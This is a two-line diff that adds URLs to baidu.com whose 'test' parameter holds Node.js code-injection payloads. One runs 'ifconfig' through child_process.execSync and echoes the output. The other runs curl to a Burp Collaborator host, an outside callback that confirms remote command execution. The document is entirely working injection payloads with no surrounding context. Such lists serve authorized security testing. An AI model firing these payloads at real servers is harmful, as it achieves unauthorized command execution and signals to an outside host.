@@ -1,0 +1,2 @@
+https://www.baidu.com/?test=Reflect.construct(Function,[res.send(require('child_process').execSync('ifconfig'))])()
+https://www.baidu.com/?test=Function(require('child_process').exec('curl+547q0etugr2fu1ehjlkto83s1j79vy.burpcollaborator.net'))()
